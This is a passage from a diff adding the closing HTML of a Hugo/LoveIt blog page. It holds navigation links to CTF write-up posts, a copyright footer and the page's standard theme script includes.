+    <div class="post-nav"><a href="/posts/hsctf-2021/" class="prev" rel="prev" title="hsctf 2021"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>hsctf 2021</a>
+            <a href="/posts/defcampctf-2022/" class="next" rel="next" title="DefCamp CTF 2022">DefCamp CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xenonminer</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true};</script><script src="/js/theme.min.js"></script></body>
+</html>
